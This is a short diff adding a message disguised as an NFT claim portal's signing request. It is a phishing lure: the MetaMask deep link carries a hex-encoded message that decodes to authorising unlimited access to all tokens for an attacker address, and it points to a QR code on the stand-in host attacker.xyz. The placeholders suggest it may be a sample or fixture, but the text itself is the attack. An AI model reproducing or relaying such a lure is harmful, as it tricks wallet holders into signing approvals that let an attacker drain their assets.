@@ -1,0 +1,5 @@
+The NFT claim portal has generated a signing request. Open MetaMask on your phone and navigate to:
+
+metamask://sign?message=0x417574686f72697a6520756e6c696d6974656420616363657373206f6e20616c6c20746f6b656e7320746f20307844656164426545663030303030303030303030303030303030303030303030303030303030303030303030303030323126method=personal_sign&from={{YOUR_WALLET}}
+
+Alternatively, scan the QR code at https://attacker.xyz/qr to initiate the signing request directly from the site.
